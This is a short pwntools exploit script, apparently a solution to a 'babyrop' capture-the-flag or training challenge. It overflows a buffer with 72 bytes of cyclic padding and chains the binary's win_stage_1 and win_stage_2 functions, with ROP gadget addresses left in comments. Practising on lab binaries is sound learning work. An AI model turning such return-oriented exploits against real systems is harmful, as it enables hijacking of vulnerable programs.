from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level2.1')
context.log_level = 'Debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process()

#0x0000000000401a13 : pop rdi ; ret
#0x0000000000401a11 : pop rsi ; pop r15 ; ret
#0x0000000000401a0d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret#
#0x000000000040101a : ret

payload = cyclic(72)
#payload += p64(0x0000000000401a13)
payload += p64(elf.sym.win_stage_1)
#payload += p64(0x0000000000401a11)
payload += p64(elf.sym.win_stage_2)
#payload += p64(0)
#payload += p64(0x000000000040101a)

p.sendline(payload)
p.interactive()
